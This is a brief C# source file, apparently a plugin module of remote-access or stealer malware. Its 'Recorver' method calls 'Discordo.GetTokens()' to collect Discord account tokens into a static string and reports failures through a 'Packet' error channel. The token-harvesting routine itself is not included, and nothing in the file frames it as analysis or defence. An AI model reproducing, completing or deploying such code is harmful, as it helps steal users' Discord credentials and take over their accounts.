using System;

namespace Plugin
{
    internal class Recorvery
    {
        public static string totaltokens = "";

        public static void Recorver()
        {
            try
            {
                Discordo.GetTokens();
            }
            catch (Exception ex)
            {
                Packet.Error("[X] Exception: " + ex.Message + ex.StackTrace);
            }
        }
    }
}